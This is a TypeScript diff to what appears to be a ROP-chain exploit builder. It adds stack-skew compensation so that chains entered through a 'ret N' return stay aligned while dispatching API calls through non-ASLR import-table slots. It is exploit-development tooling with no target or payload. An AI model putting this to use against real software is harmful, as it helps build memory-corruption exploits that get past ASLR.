@@ -1,5 +1,5 @@
 import { CapabilityIndex } from "./capabilities";
-import { firstKnownAddress, getStableAddressHint, isAddressStable, retImmBytes, setStableAddressHint } from "./chain";
+import { ChainStep, firstKnownAddress, getStableAddressHint, isAddressStable, retImmBytes, setStableAddressHint } from "./chain";
 import { RopGadget } from "./types";
 import { FrameWord, WriteFramePlan, planWriteFrame } from "./frame_write";
 
@@ -152,6 +152,12 @@ const FAIL = (unsatisfied: string[]): SlotDispatchPlan => ({
  * @param slot       the non-ASLR IAT slot holding the (ASLR'd) API pointer.
  * @param frame      the fake stdcall frame: index 0 = the API's return target
  *                   (must be executable), index 1.. = the stdcall arguments.
+ * @param entrySkewBytes  bytes the vulnerable function's return adds to ESP past
+ *                   the saved return address (e.g. a `ret 4` gives 4). The chain
+ *                   is entered via that return, so this many bytes of filler are
+ *                   inserted right after the entry gadget — before its operand —
+ *                   so ESP lands on BUF. 0 for a plain `ret`. Must be a multiple
+ *                   of 4.
  */
 export function planSlotDispatch(
   index: CapabilityIndex,
@@ -160,11 +166,26 @@ export function planSlotDispatch(
   frame: FrameWord[],
   badchars: number[] = [],
   preferStable?: (address: bigint) => boolean,
+  entrySkewBytes = 0,
 ): SlotDispatchPlan {
   const prevHint = getStableAddressHint();
   setStableAddressHint(preferStable ?? prevHint);
   try {
-    return planSlotDispatchInner(index, bufAddress, slot, frame, badchars, preferStable);
+    const plan = planSlotDispatchInner(index, bufAddress, slot, frame, badchars, preferStable);
+    if (plan.success && entrySkewBytes > 0 && plan.steps.length > 0) {
+      // The vuln returns with `ret N`, so on entry ESP is N bytes past the saved
+      // return address — it skips the word right after the entry gadget. Insert
+      // N/4 filler words there so the entry gadget's real operand (BUF) lines up.
+      const fillers = Math.floor(entrySkewBytes / 4);
+      const fillerSteps: ChainStep[] = Array.from({ length: fillers }, () => ({
+        kind: "value" as const,
+        value: 0x42424242,
+        comment: `entry-skew filler (vuln ret ${entrySkewBytes} compensation)`,
+      }));
+      plan.steps = [plan.steps[0], ...fillerSteps, ...plan.steps.slice(1)];
+      plan.stackBytes = plan.steps.length * 4;
+    }
+    return plan;
   } finally {
     setStableAddressHint(prevHint);
   }
